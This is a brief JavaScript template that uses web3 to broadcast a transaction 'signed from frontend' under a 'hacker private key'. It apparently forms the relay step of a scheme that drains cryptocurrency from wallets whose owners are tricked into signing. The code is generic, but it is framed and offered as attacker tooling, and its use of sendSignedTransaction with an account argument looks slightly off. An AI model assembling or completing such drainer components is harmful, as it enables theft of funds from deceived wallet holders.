const Web3 = require("web3");
const web3 = new Web3('${https:// alchemy endpoint | infura endpoint}');

const privateKey = '${0x hacker private key}';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

web3.eth.sendSignedTransaction('${0x signedTransaction from frontend}', account).on('receipt', console.log);
